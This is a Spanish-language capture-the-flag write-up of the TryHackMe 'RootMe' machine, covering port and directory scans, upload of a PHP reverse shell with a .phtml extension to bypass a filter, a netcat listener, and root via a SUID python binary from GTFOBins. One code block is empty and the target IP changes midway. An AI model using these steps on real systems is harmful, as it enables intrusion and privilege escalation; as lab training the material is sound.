# Resolución de la Máquina: RootMe

# Resolución: RootMe

- **Plataforma:** TryHackMe
- **Dificultad:** Fácil
- **Fecha de resolución:** 14/06/2025
- **Sistema Operativo:** Linux
- **Categoría:** Escalada de privilegios


## Descripción

"Root Me" es una máquina de nivel fácil diseñada para introducir a los usuarios en conceptos fundamentales de pruebas de penetración web y escalada de privilegios en sistemas Linux. Es ideal para principiantes que están dando sus primeros pasos en entornos de CTF.

Durante la resolución, el atacante debe identificar una vulnerabilidad web común que permite obtener acceso inicial al sistema. Posteriormente, se explora una sencilla pero efectiva técnica de escalada de privilegios basada en archivos SUID mal configurados.

Esta máquina es especialmente útil para:

> Practicar enumeración web y de servicios básicos

> Comprender cómo aprovechar inyecciones simples o ejecución remota de comandos

> Aplicar técnicas básicas de post-explotación

> Identificar binarios con permisos indebidos en sistemas Linux


## Enumeración

### Escaneo con Nmap

```bash
sudo nmap -sV -p- -T5 -sS -Pn 10.10.71.90

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-14 19:09 CEST
Warning: 10.10.71.90 giving up on port because retransmission cap hit (2).
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 53.46% done; ETC: 19:10 (0:00:30 remaining)
Nmap scan report for 10.10.71.90
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Escaneo con Gobuster

```
gobuster dir -u http://10.10.14.154 -w /usr/share/wordlists/wfuzz/general/common.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.14.154
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/wfuzz/general/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.14.154/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 309] [--> http://10.10.14.154/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.14.154/panel/]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.14.154/uploads/]
Progress: 3804 / 3808 (99.89%)
===============================================================
Finished
===============================================================
```
## Explotación

Accederemos al directorio /panel/, allí veremos que podemos subir archivos, por lo que trataremos de cargar un reverse shell en PHP que generaremos a través de https://www.revshells.com/
Nos encontraremos con que no podemos subir archivos con extensión PHP, por lo tanto le definiremos la extensión de PHTML.

Una vez cargado lo ejecutaremos accediendo al directorio /uploads/, habiendonos puesto en escucha previamente por netcat.

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.1.219] from (UNKNOWN) [10.10.14.154] 51008
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:56:50 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (914): Inappropriate ioctl for device
bash: no job control in this shell
www-data@rootme:/$
```

Para favorecer al tratamiento de la bash lanzaremos los siguientes comandos.

`python3 -c 'import pty; pty.spawn("/bin/bash")'`	Nos genera una shell interactiva
`export TERM=xterm`	Informa a los programas del tipo de terminal

Una vez establecida la conexión mediante la reverse shell ejecutaremos el siguiente comando para buscar la flag que nos solicitan

```
www-data@rootme:/$ find / -type f -name "user.txt" 2>/dev/null
find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt
www-data@rootme:/$
```
## Escalada de privilegios

Para ello buscaremos aquellos binarios que tengan el SUID activado, estos archivos se ejecutan con los permisos del propietario (normalmente root), sin importar quién los ejecute.

```

```
Si buscamos en GTFOBins veremos que el binario de python es vulnerable a SUID

```
sudo install -m =xs $(which python) .
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

